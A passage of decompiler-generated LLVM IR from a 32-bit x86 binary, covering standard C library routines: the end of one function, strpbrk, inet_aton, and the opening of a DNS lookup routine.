  br label %dec_label_pc_804bd29

dec_label_pc_804bd25:                             ; preds = %dec_label_pc_804bd06
  %v9_804bd0a = inttoptr i32 %v8_804bd0a to i8*
  store i8 0, i8* %v9_804bd0a, align 1
  %v2_804bd28 = add i32 %v8_804bd0a, 1
  br label %dec_label_pc_804bd29

dec_label_pc_804bd29:                             ; preds = %dec_label_pc_804bd16, %dec_label_pc_804bd25
  %storemerge = phi i32 [ %v2_804bd28, %dec_label_pc_804bd25 ], [ %v8_804bd1b, %dec_label_pc_804bd16 ]
  %v0_804bd29 = phi i32 [ %v2_804bd28, %dec_label_pc_804bd25 ], [ %v8_804bd1b, %dec_label_pc_804bd16 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v1_804bd29 = load i32, i32* @esi, align 4
  %v2_804bd29 = inttoptr i32 %v1_804bd29 to i32*
  store i32 %v0_804bd29, i32* %v2_804bd29, align 4
  %v0_804bd2b = load i32, i32* @ebx, align 4
  store i32 %v0_804bd2b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804bd2d

dec_label_pc_804bd2d:                             ; preds = %dec_label_pc_804bd00, %dec_label_pc_804bd29
  %v0_804bd30 = phi i32 [ %v0_804bd30.pre, %dec_label_pc_804bd00 ], [ %v0_804bd2b, %dec_label_pc_804bd29 ]
  %v2_804bd2d = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804bd2d, i32* @ebx, align 4
  store i32 %v0_804bcd9, i32* @esi, align 4
  store i32 %v0_804bcd8, i32* @edi, align 4
  ret i32 %v0_804bd30

; uselistorder directives
  uselistorder i32 %v8_804bd0a, { 3, 5, 0, 1, 2, 4 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804bd2d, { 1, 0 }
  uselistorder label %dec_label_pc_804bd29, { 1, 0 }
  uselistorder label %dec_label_pc_804bced, { 1, 0 }
}

define i32 @__GI_strpbrk(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_804bd35 = load i32, i32* @ebx, align 4
  %v2_804bd4c24 = load i8, i8* %arg1, align 1
  %v4_804bd4e28 = icmp eq i8 %v2_804bd4c24, 0
  br i1 %v4_804bd4e28, label %dec_label_pc_804bd56, label %dec_label_pc_804bd52.lr.ph

dec_label_pc_804bd52.lr.ph:                       ; preds = %entry
  %v3_804bd4c25 = zext i8 %v2_804bd4c24 to i32
  %v5_804bd4c26 = and i32 %v0_804bd35, -256
  %v6_804bd4c27 = or i32 %v3_804bd4c25, %v5_804bd4c26
  %v4_804bd3a = ptrtoint i8* %arg1 to i32
  %v1_804bd4513 = inttoptr i32 %arg2 to i8*
  %v4_804bd45.pre.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804bd52

dec_label_pc_804bd40:                             ; preds = %dec_label_pc_804bd52, %dec_label_pc_804bd44
  %v6_804bd4522 = phi i32 [ %v6_804bd45, %dec_label_pc_804bd44 ], [ %v6_804bd4517, %dec_label_pc_804bd52 ]
  %v2_804bd4521 = phi i8 [ %v2_804bd45, %dec_label_pc_804bd44 ], [ %v2_804bd4514, %dec_label_pc_804bd52 ]
  %v0_804bd4420 = phi i32 [ %v1_804bd44, %dec_label_pc_804bd44 ], [ %arg2, %dec_label_pc_804bd52 ]
  %v15_804bd40 = icmp eq i8 %v2_804bd4521, %v2_804bd4c31
  br i1 %v15_804bd40, label %dec_label_pc_804bd58, label %dec_label_pc_804bd44

dec_label_pc_804bd44:                             ; preds = %dec_label_pc_804bd40
  %v1_804bd44 = add i32 %v0_804bd4420, 1
  store i32 %v1_804bd44, i32* @edx, align 4
  %v1_804bd45 = inttoptr i32 %v1_804bd44 to i8*
  %v2_804bd45 = load i8, i8* %v1_804bd45, align 1
  %v3_804bd45 = zext i8 %v2_804bd45 to i32
  %v5_804bd45 = and i32 %v6_804bd4522, -256
  %v6_804bd45 = or i32 %v3_804bd45, %v5_804bd45
  store i32 %v6_804bd45, i32* @ecx, align 4
  %v4_804bd47 = icmp eq i8 %v2_804bd45, 0
  %v1_804bd49 = icmp eq i1 %v4_804bd47, false
  br i1 %v1_804bd49, label %dec_label_pc_804bd40, label %dec_label_pc_804bd4b

dec_label_pc_804bd4b:                             ; preds = %dec_label_pc_804bd44, %dec_label_pc_804bd52
  %v4_804bd45.pre34 = phi i32 [ %v6_804bd4517, %dec_label_pc_804bd52 ], [ %v6_804bd45, %dec_label_pc_804bd44 ]
  %v1_804bd4b = add i32 %v0_804bd4b29, 1
  %v1_804bd4c = inttoptr i32 %v1_804bd4b to i8*
  %v2_804bd4c = load i8, i8* %v1_804bd4c, align 1
  %v3_804bd4c = zext i8 %v2_804bd4c to i32
  %v5_804bd4c = and i32 %v6_804bd4c32, -256
  %v6_804bd4c = or i32 %v3_804bd4c, %v5_804bd4c
  %v4_804bd4e = icmp eq i8 %v2_804bd4c, 0
  br i1 %v4_804bd4e, label %dec_label_pc_804bd56, label %dec_label_pc_804bd52

dec_label_pc_804bd52:                             ; preds = %dec_label_pc_804bd52.lr.ph, %dec_label_pc_804bd4b
  %v4_804bd45.pre = phi i32 [ %v4_804bd45.pre.pre, %dec_label_pc_804bd52.lr.ph ], [ %v4_804bd45.pre34, %dec_label_pc_804bd4b ]
  %v6_804bd4c32 = phi i32 [ %v6_804bd4c27, %dec_label_pc_804bd52.lr.ph ], [ %v6_804bd4c, %dec_label_pc_804bd4b ]
  %v2_804bd4c31 = phi i8 [ %v2_804bd4c24, %dec_label_pc_804bd52.lr.ph ], [ %v2_804bd4c, %dec_label_pc_804bd4b ]
  %v0_804bd4b29 = phi i32 [ %v4_804bd3a, %dec_label_pc_804bd52.lr.ph ], [ %v1_804bd4b, %dec_label_pc_804bd4b ]
  store i32 %arg2, i32* @edx, align 4
  %v2_804bd4514 = load i8, i8* %v1_804bd4513, align 1
  %v3_804bd4515 = zext i8 %v2_804bd4514 to i32
  %v5_804bd4516 = and i32 %v4_804bd45.pre, -256
  %v6_804bd4517 = or i32 %v3_804bd4515, %v5_804bd4516
  store i32 %v6_804bd4517, i32* @ecx, align 4
  %v4_804bd4718 = icmp eq i8 %v2_804bd4514, 0
  %v1_804bd4919 = icmp eq i1 %v4_804bd4718, false
  br i1 %v1_804bd4919, label %dec_label_pc_804bd40, label %dec_label_pc_804bd4b

dec_label_pc_804bd56:                             ; preds = %dec_label_pc_804bd4b, %entry
  br label %dec_label_pc_804bd58

dec_label_pc_804bd58:                             ; preds = %dec_label_pc_804bd40, %dec_label_pc_804bd56
  %v0_804bd5a = phi i32 [ 0, %dec_label_pc_804bd56 ], [ %v0_804bd4b29, %dec_label_pc_804bd40 ]
  store i32 %v0_804bd35, i32* @ebx, align 4
  ret i32 %v0_804bd5a

; uselistorder directives
  uselistorder i32 %v6_804bd4517, { 2, 0, 1 }
  uselistorder i8 %v2_804bd4514, { 1, 2, 0 }
  uselistorder i32 %v1_804bd4b, { 1, 0 }
  uselistorder i32 %v6_804bd45, { 1, 2, 0 }
  uselistorder i8 %v2_804bd45, { 1, 2, 0 }
  uselistorder i32 %v1_804bd44, { 2, 1, 0 }
  uselistorder i8 %v2_804bd4c24, { 0, 2, 1 }
  uselistorder i32 %v0_804bd35, { 1, 0 }
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804bd58, { 1, 0 }
  uselistorder label %dec_label_pc_804bd52, { 1, 0 }
  uselistorder label %dec_label_pc_804bd4b, { 1, 0 }
}

define i32 @inet_aton(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_804bd63 = ptrtoint i8* %arg1 to i32
  store i32 %v4_804bd63, i32* @ecx, align 4
  %v1_804bd67 = icmp eq i8* %arg1, null
  br i1 %v1_804bd67, label %dec_label_pc_804bde8, label %dec_label_pc_804bd6b

dec_label_pc_804bd6b:                             ; preds = %entry
  %v0_804bd79.pre = load i32, i32* @global_var_8052038, align 8
  br label %dec_label_pc_804bd76

dec_label_pc_804bd76:                             ; preds = %dec_label_pc_804bd6b, %dec_label_pc_804bdbf
  %v2_804bdc236 = phi i32 [ 1, %dec_label_pc_804bd6b ], [ %v3_804bdc2, %dec_label_pc_804bdbf ]
  %v0_804bd7635 = phi i32 [ %v4_804bd63, %dec_label_pc_804bd6b ], [ %v0_804bd764, %dec_label_pc_804bdbf ]
  %v0_804bddd34 = phi i32 [ 0, %dec_label_pc_804bd6b ], [ %v2_804bdc5, %dec_label_pc_804bdbf ]
  %v1_804bd76 = inttoptr i32 %v0_804bd7635 to i8*
  %v2_804bd76 = load i8, i8* %v1_804bd76, align 1
  %v3_804bd76 = sext i8 %v2_804bd76 to i32
  %v2_804bd7f = mul nsw i32 %v3_804bd76, 2
  %v3_804bd7f = add i32 %v2_804bd7f, %v0_804bd79.pre
  %v4_804bd7f = inttoptr i32 %v3_804bd7f to i8*
  %v5_804bd7f = load i8, i8* %v4_804bd7f, align 1
  %v6_804bd7f = and i8 %v5_804bd7f, 8
  %v7_804bd7f = icmp eq i8 %v6_804bd7f, 0
  br i1 %v7_804bd7f, label %dec_label_pc_804bde8, label %dec_label_pc_804bd86

dec_label_pc_804bd86:                             ; preds = %dec_label_pc_804bd76
  %v4_804bd9a.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804bd9a

dec_label_pc_804bd8a:                             ; preds = %dec_label_pc_804bd9a
  %v3_804bd8a = mul i32 %v1_804bd8a, 10
  %v2_804bd8d = add i32 %v3_804bd8a, -48
  %v3_804bd8d = add i32 %v2_804bd8d, %v2_804bd9c
  %v1_804bd91 = add i32 %v3_804bd8d, -255
  %v6_804bd91 = sub i32 254, %v3_804bd8d
  %v7_804bd91 = and i32 %v6_804bd91, %v3_804bd8d
  %v8_804bd91 = icmp slt i32 %v7_804bd91, 0
  %v9_804bd91 = icmp eq i32 %v1_804bd91, 0
  %v10_804bd91 = icmp slt i32 %v1_804bd91, 0
  %v3_804bd97 = icmp eq i1 %v10_804bd91, %v8_804bd91
  %v4_804bd97 = icmp eq i1 %v9_804bd91, false
  %v5_804bd97 = and i1 %v4_804bd97, %v3_804bd97
  br i1 %v5_804bd97, label %dec_label_pc_804bde8, label %dec_label_pc_804bd99

dec_label_pc_804bd99:                             ; preds = %dec_label_pc_804bd8a
  %v1_804bd99 = add i32 %v0_804bd99, 1
  store i32 %v1_804bd99, i32* @ecx, align 4
  br label %dec_label_pc_804bd9a

dec_label_pc_804bd9a:                             ; preds = %dec_label_pc_804bd86, %dec_label_pc_804bd99
  %v1_804bd8a = phi i32 [ 0, %dec_label_pc_804bd86 ], [ %v3_804bd8d, %dec_label_pc_804bd99 ]
  %v4_804bd9a = phi i32 [ %v4_804bd9a.pre, %dec_label_pc_804bd86 ], [ %v6_804bd9a, %dec_label_pc_804bd99 ]
  %v0_804bd99 = phi i32 [ %v0_804bd7635, %dec_label_pc_804bd86 ], [ %v1_804bd99, %dec_label_pc_804bd99 ]
  %v1_804bd9a = inttoptr i32 %v0_804bd99 to i8*
  %v2_804bd9a = load i8, i8* %v1_804bd9a, align 1
  %v3_804bd9a = zext i8 %v2_804bd9a to i32
  %v5_804bd9a = and i32 %v4_804bd9a, -256
  %v6_804bd9a = or i32 %v3_804bd9a, %v5_804bd9a
  store i32 %v6_804bd9a, i32* @edx, align 4
  %v2_804bd9c = sext i8 %v2_804bd9a to i32
  %v2_804bd9f = mul nsw i32 %v2_804bd9c, 2
  %v3_804bd9f = add i32 %v2_804bd9f, %v0_804bd79.pre
  %v4_804bd9f = inttoptr i32 %v3_804bd9f to i16*
  %v5_804bd9f = load i16, i16* %v4_804bd9f, align 2
  %v2_804bda4 = and i16 %v5_804bd9f, 8
  %v3_804bda4 = icmp eq i16 %v2_804bda4, 0
  %v1_804bda6 = icmp eq i1 %v3_804bda4, false
  br i1 %v1_804bda6, label %dec_label_pc_804bd8a, label %dec_label_pc_804bda8

dec_label_pc_804bda8:                             ; preds = %dec_label_pc_804bd9a
  %v8_804bda8 = sub nsw i32 2, %v2_804bdc236
  %v9_804bda8 = and i32 %v8_804bda8, %v2_804bdc236
  %v10_804bda8 = icmp slt i32 %v9_804bda8, 0
  %v11_804bda8 = icmp eq i32 %v2_804bdc236, 3
  %v12_804bda8 = icmp slt i32 %v2_804bdc236, 3
  %v3_804bdac = icmp eq i1 %v12_804bda8, %v10_804bda8
  %v4_804bdac = icmp eq i1 %v11_804bda8, false
  %v5_804bdac = and i1 %v4_804bdac, %v3_804bdac
  br i1 %v5_804bdac, label %dec_label_pc_804bdb6, label %dec_label_pc_804bdae

dec_label_pc_804bdae:                             ; preds = %dec_label_pc_804bda8
  %v10_804bdae = icmp eq i8 %v2_804bd9a, 46
  %v1_804bdb1 = icmp eq i1 %v10_804bdae, false
  br i1 %v1_804bdb1, label %dec_label_pc_804bde8, label %dec_label_pc_804bdb3

dec_label_pc_804bdb3:                             ; preds = %dec_label_pc_804bdae
  %v1_804bdb3 = add i32 %v0_804bd99, 1
  store i32 %v1_804bdb3, i32* @ecx, align 4
  br label %dec_label_pc_804bdbf

dec_label_pc_804bdb6:                             ; preds = %dec_label_pc_804bda8
  %v1_804bdb6 = add i32 %v0_804bd99, 1
  store i32 %v1_804bdb6, i32* @ecx, align 4
  %v4_804bdb7 = icmp eq i8 %v2_804bd9a, 0
  br i1 %v4_804bdb7, label %dec_label_pc_804bdbf, label %dec_label_pc_804bdbb

dec_label_pc_804bdbb:                             ; preds = %dec_label_pc_804bdb6
  %v2_804bdbb = and i16 %v5_804bd9f, 32
  %v3_804bdbb = icmp eq i16 %v2_804bdbb, 0
  br i1 %v3_804bdbb, label %dec_label_pc_804bde8, label %dec_label_pc_804bdbf

dec_label_pc_804bdbf:                             ; preds = %dec_label_pc_804bdbb, %dec_label_pc_804bdb6, %dec_label_pc_804bdb3
  %v0_804bd764 = phi i32 [ %v1_804bdb6, %dec_label_pc_804bdbb ], [ %v1_804bdb6, %dec_label_pc_804bdb6 ], [ %v1_804bdb3, %dec_label_pc_804bdb3 ]
  %v2_804bdbf = mul i32 %v0_804bddd34, 256
  %v3_804bdc2 = add nuw nsw i32 %v2_804bdc236, 1
  %v2_804bdc5 = or i32 %v1_804bd8a, %v2_804bdbf
  %v7_804bdcb = icmp sgt i32 %v2_804bdc236, 3
  br i1 %v7_804bdcb, label %dec_label_pc_804bdcd, label %dec_label_pc_804bd76

dec_label_pc_804bdcd:                             ; preds = %dec_label_pc_804bdbf
  %v4_804bdd2 = icmp eq i32 %arg2, 0
  br i1 %v4_804bdd2, label %dec_label_pc_804bdea, label %dec_label_pc_804bdd9

dec_label_pc_804bdd9:                             ; preds = %dec_label_pc_804bdcd
  %v1_804bddd = call i32 @llvm.bswap.i32(i32 %v2_804bdc5)
  %v2_804bddf = inttoptr i32 %arg2 to i32*
  store i32 %v1_804bddd, i32* %v2_804bddf, align 4
  br label %dec_label_pc_804bdea

dec_label_pc_804bde8:                             ; preds = %dec_label_pc_804bdbb, %dec_label_pc_804bdae, %dec_label_pc_804bd76, %dec_label_pc_804bd8a, %entry
  br label %dec_label_pc_804bdea

dec_label_pc_804bdea:                             ; preds = %dec_label_pc_804bdcd, %dec_label_pc_804bdd9, %dec_label_pc_804bde8
  %v0_804bdef = phi i32 [ 1, %dec_label_pc_804bdcd ], [ 1, %dec_label_pc_804bdd9 ], [ 0, %dec_label_pc_804bde8 ]
  ret i32 %v0_804bdef

; uselistorder directives
  uselistorder i32 %v2_804bd9c, { 1, 0 }
  uselistorder i32 %v6_804bd9a, { 1, 0 }
  uselistorder i8 %v2_804bd9a, { 1, 0, 2, 3 }
  uselistorder i32 %v0_804bd99, { 0, 1, 3, 2 }
  uselistorder i32 %v1_804bd91, { 1, 0 }
  uselistorder i32 %v3_804bd8d, { 1, 0, 3, 2 }
  uselistorder i32 %v0_804bd7635, { 1, 0 }
  uselistorder i32 %v2_804bdc236, { 1, 4, 2, 0, 5, 3 }
  uselistorder i32 (i32)* @llvm.bswap.i32, { 2, 0, 1 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804bdea, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804bde8, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_804bd9a, { 1, 0 }
  uselistorder label %dec_label_pc_804bd76, { 1, 0 }
}

define i32 @__dns_lookup(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp34 = sext i32 %arg2 to i64
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-236 = alloca i32, align 4
  %stack_var_-252 = alloca i8*, align 4
  store i32 %arg3, i32* @edi, align 4
  store i8* inttoptr (i32 512 to i8*), i8** %stack_var_-252, align 4
  %v2_804be06 = call i32 @malloc(i32 512)
  store i32 %v2_804be06, i32* %eax.global-to-local, align 4
  store i8* inttoptr (i32 1025 to i8*), i8** %stack_var_-252, align 4
  store i32 %v2_804be06, i32* @ebp, align 4
  %v2_804be14 = call i32 @malloc(i32 1025)
  store i32 %v2_804be14, i32* %eax.global-to-local, align 4
  %v12_804be1d = ptrtoint i32* %stack_var_-236 to i32
  %v1_804be20 = icmp eq i32 %v2_804be06, 0
  br i1 %v1_804be20, label %dec_label_pc_804c499, label %dec_label_pc_804be28

dec_label_pc_804be28:                             ; preds = %entry
  %v1_804be28 = icmp eq i32 %v2_804be14, 0
  br i1 %v1_804be28, label %dec_label_pc_804c499, label %dec_label_pc_804be30

dec_label_pc_804be30:                             ; preds = %dec_label_pc_804be28
  %v5_804be30 = icmp eq i32 %arg2, 0
  br i1 %v5_804be30, label %dec_label_pc_804c499, label %dec_label_pc_804be3e

dec_label_pc_804be3e:                             ; preds = %dec_label_pc_804be30
  %v4_804be3e = ptrtoint i8* %arg1 to i32
  store i32 %v4_804be3e, i32* %eax.global-to-local, align 4
  %v2_804be45 = load i8, i8* %arg1, align 1
  %v3_804be45 = icmp eq i8 %v2_804be45, 0
  br i1 %v3_804be45, label %dec_label_pc_804c499, label %dec_label_pc_804be4e

dec_label_pc_804be4e:                             ; preds = %dec_label_pc_804be3e
  store i8* %arg1, i8** %stack_var_-252, align 4
  %v3_804be52 = call i32 @strlen(i8* nonnull %arg1)
  store i32 %v3_804be52, i32* @eax, align 4
  store i32 %v4_804be3e, i32* %edx.global-to-local, align 4
  %v2_804be75 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_804be75, i32* @ebx, align 4
  %tmp47 = bitcast i32* %stack_var_-52 to i8*
  store i8* %tmp47, i8** %stack_var_-252, align 4
  %v3_804be7d = call i32 @__pthread_return_void(i32 %v2_804be75, i32 134526403)
  store i32 %v3_804be7d, i32* %eax.global-to-local, align 4
  store i8* bitcast (i8** @global_var_8052528.84 to i8*), i8** %stack_var_-252, align 4
  %v2_804be89 = call i32 @__pthread_return_0(i32 ptrtoint (i8** @global_var_8052528.84 to i32))
  %v0_804be8e = load i64, i64* @global_var_8052540.85, align 8
  %v1_804be8e = trunc i64 %v0_804be8e to i32
  %v1_804be93 = ashr i32 %v1_804be8e, 31
  %v6_804be94 = and i64 %v0_804be8e, 4294967295
  %v8_804be94 = zext i32 %v1_804be93 to i64
  %v9_804be94 = mul nuw i64 %v8_804be94, 4294967296
  %v10_804be94 = or i64 %v9_804be94, %v6_804be94
  %v14_804be94 = srem i64 %v10_804be94, %tmp34
  %v15_804be94 = trunc i64 %v14_804be94 to i32
  %v0_804be9b = load i16, i16* @global_var_805215c.86, align 4
  %v2_804beaa = load i8*, i8** %stack_var_-252, align 4
  %v3_804beaa = ptrtoint i8* %v2_804beaa to i32
  store i32 %v3_804beaa, i32* @eax, align 4
  store i32 134526403, i32* %edx.global-to-local, align 4
  store i8* %tmp47, i8** %stack_var_-252, align 4
  %v3_804beaf = call i32 @__pthread_return_void(i32 %v2_804be75, i32 1)
  store i32 %v3_804beaf, i32* %eax.global-to-local, align 4
  %v3_804bef3 = sext i16 %v0_804be9b to i32
  %v5_804c056 = inttoptr i32 %v15_804be94 to i8*
  %v1_804c47488 = add i32 %v12_804be1d, 28
  %v2_804c47489 = inttoptr i32 %v1_804c47488 to i32*
  %v3_804c47490 = load i32, i32* %v2_804c47489, align 4
  %tmp120 = icmp ult i32 %v3_804c47490, 3
  br i1 %tmp120, label %dec_label_pc_804bed4, label %dec_label_pc_804c499

dec_label_pc_804bed4:                             ; preds = %dec_label_pc_804be4e, %dec_label_pc_804c474.backedge
  %v0_804bedb93 = phi i32 [ %v0_804c474.pre, %dec_label_pc_804c474.backedge ], [ %v12_804be1d, %dec_label_pc_804be4e ]
  %v1_804bed4 = add i32 %v0_804bedb93, 20
  %v2_804bed4 = inttoptr i32 %v1_804bed4 to i32*
  %v3_804bed4 = load i32, i32* %v2_804bed4, align 4
  %v13_804bed4 = icmp eq i32 %v3_804bed4, -1
  br i1 %v13_804bed4, label %dec_label_pc_804bed4.dec_label_pc_804beea_crit_edge, label %dec_label_pc_804bedb

dec_label_pc_804bed4.dec_label_pc_804beea_crit_edge: ; preds = %dec_label_pc_804bed4
  %v0_804beea.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804beea

dec_label_pc_804bedb:                             ; preds = %dec_label_pc_804bed4
  %v3_804bede = load i32, i32* %v2_804bed4, align 4
  %v5_804bede = add i32 %v0_804bedb93, -16
  %v6_804bede = inttoptr i32 %v5_804bede to i32*
  store i32 %v3_804bede, i32* %v6_804bede, align 4
  %v1_804bee2 = call i32 @__libc_close(i32 -1)
  store i32 %v1_804bee2, i32* %eax.global-to-local, align 4
  %v0_804bee7 = load i32, i32* @esp, align 4
  %v1_804bee7 = add i32 %v0_804bee7, 16
  br label %dec_label_pc_804beea

dec_label_pc_804beea:                             ; preds = %dec_label_pc_804bed4.dec_label_pc_804beea_crit_edge, %dec_label_pc_804bedb
  %v1_804beea = phi i32 [ %v0_804bedb93, %dec_label_pc_804bed4.dec_label_pc_804beea_crit_edge ], [ %v1_804bee7, %dec_label_pc_804bedb ]
  %v0_804beea = phi i32 [ %v0_804beea.pre, %dec_label_pc_804bed4.dec_label_pc_804beea_crit_edge ], [ %v1_804bee2, %dec_label_pc_804bedb ]
  %v2_804beea = add i32 %v1_804beea, -4
  %v3_804beea = inttoptr i32 %v2_804beea to i32*
  store i32 %v0_804beea, i32* %v3_804beea, align 4
  %v1_804beeb = add i32 %v1_804beea, -8
  %v2_804beeb = inttoptr i32 %v1_804beeb to i32*
  store i32 512, i32* %v2_804beeb, align 4
  %v1_804bef0 = add i32 %v1_804beea, -12
  %v2_804bef0 = inttoptr i32 %v1_804bef0 to i32*
  store i32 0, i32* %v2_804bef0, align 4
  %v2_804bef2 = add i32 %v1_804beea, -16
  %v3_804bef2 = inttoptr i32 %v2_804bef2 to i32*
  store i32 %v2_804be06, i32* %v3_804bef2, align 4
  %v5_804bef3 = call i32 @__GI_memset(i8* inttoptr (i32 -1 to i8*), i32 %v15_804be94, i32 %v3_804bef3)
  store i32 %v5_804bef3, i32* %eax.global-to-local, align 4
  %v0_804bef8 = load i32, i32* @esp, align 4
  %v1_804befb = add i32 %v0_804bef8, 8
  %v2_804befb = inttoptr i32 %v1_804befb to i32*
  store i32 48, i32* %v2_804befb, align 4
  %v1_804befd = add i32 %v0_804bef8, 4
  %v2_804befd = inttoptr i32 %v1_804befd to i32*
  store i32 0, i32* %v2_804befd, align 4
  %v1_804beff = add i32 %v0_804bef8, 84
  store i32 %v1_804beff, i32* @ebx, align 4
  %v3_804bf03 = inttoptr i32 %v0_804bef8 to i32*
  store i32 %v1_804beff, i32* %v3_804bf03, align 4
  %v5_804bf04 = call i32 @__GI_memset(i8* inttoptr (i32 -1 to i8*), i32 %v15_804be94, i32 %v3_804bef3)
  store i32 %v5_804bf04, i32* %eax.global-to-local, align 4
  %v0_804bf09 = load i32, i32* @esp, align 4
  %v1_804bf09 = add i32 %v0_804bf09, 60
  %v2_804bf09 = inttoptr i32 %v1_804bf09 to i32*
  %v3_804bf09 = load i32, i32* %v2_804bf09, align 4
  store i32 %v3_804bf09, i32* %eax.global-to-local, align 4
  %v1_804bf0d = add i32 %v0_804bf09, 116
  %v2_804bf0d = inttoptr i32 %v1_804bf0d to i32*
  store i32 1, i32* %v2_804bf0d, align 4
  %v0_804bf15 = load i32, i32* %eax.global-to-local, align 4
  %v1_804bf15 = add i32 %v0_804bf15, 1
  %v0_804bf16 = load i32, i32* @esp, align 4
  %v1_804bf16 = add i32 %v0_804bf16, 104
  %v2_804bf16 = inttoptr i32 %v1_804bf16 to i32*
  store i32 1, i32* %v2_804bf16, align 4
  %v1_804bf1e = urem i32 %v1_804bf15, 65536
  store i32 %v1_804bf1e, i32* %eax.global-to-local, align 4
  %v1_804bf23 = load i32, i32* @esp, align 4
  %v2_804bf23 = add i32 %v1_804bf23, 60
  %v3_804bf23 = inttoptr i32 %v2_804bf23 to i32*
  store i32 %v1_804bf1e, i32* %v3_804bf23, align 4
  %v0_804bf27 = load i32, i32* %eax.global-to-local, align 4
  %v1_804bf27 = load i32, i32* @esp, align 4
  %v2_804bf27 = add i32 %v1_804bf27, 84
  %v3_804bf27 = inttoptr i32 %v2_804bf27 to i32*
  store i32 %v0_804bf27, i32* %v3_804bf27, align 4
  %v0_804bf2b = load i32, i32* @esp, align 4
  %v1_804bf2e = add i32 %v0_804bf2b, 8
  %v2_804bf2e = inttoptr i32 %v1_804bf2e to i32*
  store i32 512, i32* %v2_804bf2e, align 4
  %v2_804bf33 = add i32 %v0_804bf2b, 4
  %v3_804bf33 = inttoptr i32 %v2_804bf33 to i32*
  store i32 %v2_804be06, i32* %v3_804bf33, align 4
  %v0_804bf34 = load i32, i32* @ebx, align 4
  %v3_804bf34 = inttoptr i32 %v0_804bf2b to i32*
  store i32 %v0_804bf34, i32* %v3_804bf34, align 4
  %v0_804bf35 = call i32 @__encode_header()
  store i32 %v0_804bf35, i32* %eax.global-to-local, align 4
  %v0_804bf3a = load i32, i32* @esp, align 4
  store i32 %v0_804bf35, i32* @ebx, align 4
  %v2_804bf3f = icmp slt i32 %v0_804bf35, 0
  br i1 %v2_804bf3f, label %dec_label_pc_804c499, label %dec_label_pc_804bf47

dec_label_pc_804bf47:                             ; preds = %dec_label_pc_804beea
  %v2_804bf47 = add i32 %v0_804bf3a, 12
  %v3_804bf47 = inttoptr i32 %v2_804bf47 to i32*
  store i32 %v0_804bf35, i32* %v3_804bf47, align 4
  %v1_804bf48 = add i32 %v0_804bf3a, 8
  %v2_804bf48 = inttoptr i32 %v1_804bf48 to i32*
  store i32 1025, i32* %v2_804bf48, align 4
  %v1_804bf4d = add i32 %v0_804bf3a, 256
  %v2_804bf4d = inttoptr i32 %v1_804bf4d to i32*
  %v3_804bf4d = load i32, i32* %v2_804bf4d, align 4
  %v5_804bf4d = add i32 %v0_804bf3a, 4
  %v6_804bf4d = inttoptr i32 %v5_804bf4d to i32*
  store i32 %v3_804bf4d, i32* %v6_804bf4d, align 4
  %v1_804bf54 = add i32 %v0_804bf3a, 28
  %v2_804bf54 = inttoptr i32 %v1_804bf54 to i32*
  %v3_804bf54 = load i32, i32* %v2_804bf54, align 4
  %v6_804bf54 = inttoptr i32 %v0_804bf3a to i32*
  store i32 %v3_804bf54, i32* %v6_804bf54, align 4
  %v6_804bf58 = call i32 @strncpy(i8* inttoptr (i32 -1 to i8*), i32 %v15_804be94, i32 %v3_804bef3, i32 ptrtoint (i32* @0 to i32))
  %v0_804bf5d = load i32, i32* @esp, align 4
  %v1_804bf60 = add i32 %v0_804bf5d, 8
  %v2_804bf60 = inttoptr i32 %v1_804bf60 to i32*
  store i32 ptrtoint (i32* @global_var_8052160.32 to i32), i32* %v2_804bf60, align 4
  %v1_804bf65 = add i32 %v0_804bf5d, 4
  %v2_804bf65 = inttoptr i32 %v1_804bf65 to i32*
  store i32 134526403, i32* %v2_804bf65, align 4
  %v1_804bf6a = add i32 %v0_804bf5d, 200
  store i32 %v1_804bf6a, i32* @eax, align 4
  %v3_804bf71 = inttoptr i32 %v0_804bf5d to i32*
  store i32 %v1_804bf6a, i32* %v3_804bf71, align 4
  %v2_804bf72 = call i32 @__pthread_return_void(i32 -1, i32 %v15_804be94)
  store i32 %v2_804bf72, i32* %eax.global-to-local, align 4
  %v0_804bf77 = load i32, i32* @esp, align 4
  %v1_804bf77 = inttoptr i32 %v0_804bf77 to i32*
  store i32 ptrtoint (i32* @global_var_8052160.32 to i32), i32* %v1_804bf77, align 4
  %v1_804bf7e = call i32 @__pthread_return_0(i32 -1)
  store i32 %v1_804bf7e, i32* %eax.global-to-local, align 4
  %v0_804bf83 = load i32, i32* @esp, align 4
  %v1_804bf83 = add i32 %v0_804bf83, 56
  %v2_804bf83 = inttoptr i32 %v1_804bf83 to i32*
  %v3_804bf83 = load i32, i32* %v2_804bf83, align 4
  store i32 %v3_804bf83, i32* %edx.global-to-local, align 4
  %v1_804bf87 = add i32 %v0_804bf83, 268
  %v2_804bf87 = inttoptr i32 %v1_804bf87 to i32*
  %v3_804bf87 = load i32, i32* %v2_804bf87, align 4
  store i32 %v3_804bf87, i32* %eax.global-to-local, align 4
  %v2_804bf8e = mul i32 %v3_804bf83, 4
  %v3_804bf8e = add i32 %v3_804bf87, %v2_804bf8e
  %v4_804bf8e = inttoptr i32 %v3_804bf8e to i32*
  %v5_804bf8e = load i32, i32* %v4_804bf8e, align 4
  store i32 %v5_804bf8e, i32* %edx.global-to-local, align 4
  %v2_804bf91 = add i32 %v0_804bf83, 48
